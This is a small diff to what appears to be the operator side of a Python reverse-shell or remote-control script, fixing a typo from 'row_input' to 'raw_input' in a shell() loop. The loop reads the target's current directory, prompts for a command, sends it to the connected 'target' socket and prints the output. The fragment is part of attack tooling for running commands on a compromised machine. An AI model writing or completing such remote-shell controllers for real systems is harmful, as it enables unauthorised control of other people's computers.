@@ -5,7 +5,7 @@ import socket
 
 def shell():
     current_dir = target.recv(1024)
-    comando = row_input("{}~#" .format(current_dir))
+    comando = raw_input("{}~#" .format(current_dir))
     target.send(comando)
     res = target.recv(1024)
     print(res)
